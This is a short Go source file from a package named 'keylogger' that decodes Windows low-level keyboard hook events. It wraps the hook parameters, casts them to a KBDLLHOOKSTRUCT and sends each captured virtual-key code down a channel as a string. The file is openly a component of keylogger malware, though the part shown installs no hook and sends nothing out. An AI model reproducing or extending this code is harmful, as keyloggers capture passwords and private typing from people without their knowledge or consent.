package keylogger

import (
	"fmt"
	"unsafe"

	"github.com/Spriithy/gkl/wintypes"
)

type KeyboardEvent struct {
	WParam wintypes.WPARAM
	LParam wintypes.LPARAM
}

func (ke KeyboardEvent) GetKBDLLHOOKSTRUCT() *wintypes.KBDLLHOOKSTRUCT {
	return (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(ke.LParam))
}

type KeyStrokeDecoder struct {
	input  chan KeyboardEvent
	output chan string
	buf    string
}

func NewKeyStrokeDecoder(input chan KeyboardEvent, output chan string) *KeyStrokeDecoder {
	return &KeyStrokeDecoder{
		input:  input,
		output: output,
	}
}

func (ksd *KeyStrokeDecoder) Listen() {
	for {
		event := <-ksd.input
		kbd := event.GetKBDLLHOOKSTRUCT()
		ksd.output <- fmt.Sprintf("%q", kbd.VkCode)
	}
}
